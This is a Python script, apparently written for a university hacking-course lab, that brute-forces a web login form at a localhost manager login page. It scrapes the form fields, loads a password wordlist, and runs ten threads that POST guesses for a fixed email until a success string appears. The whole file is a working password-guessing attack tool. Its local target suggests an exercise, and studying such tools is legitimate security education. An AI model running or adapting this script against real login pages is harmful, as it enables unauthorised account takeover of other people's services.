from io import BytesIO
from lxml import etree
from queue import Queue
import requests
import sys
import threading
import time

SUCCESS = 'You logged in as:'
TARGET = 'http://127.0.0.1:8000/accounts/login/manager/'
WORDLIST = 'C:\\Users\\Damwid\\OneDrive\\Dokumenty\\UKSW\\2 Rok\\Hacking\\cain.txt'

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.xpath('//form/input | //form/select'):  # Updated XPath to get form fields
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', '')
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nStarting bruteforce attack on {url}.\n')
        print("Configuration completed for username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['email'] = self.username  # Change to match the 'name' attribute of the email input field
        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Testing username and password: {self.username}/{passwd}')
            params['password'] = passwd  # Change to match the 'name' attribute of the password input field
            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.text:
                self.found = True
                print(f"\nSuccessful attack")
                print("Username: %s" % self.username)
                print("Password: %s\n" % passwd)
                print('Finished. Cleaning up other threads...')

if __name__ == '__main__':
    words = get_words()
    b = Bruter('manager@example.com', TARGET)
    b.run_bruteforce(words)
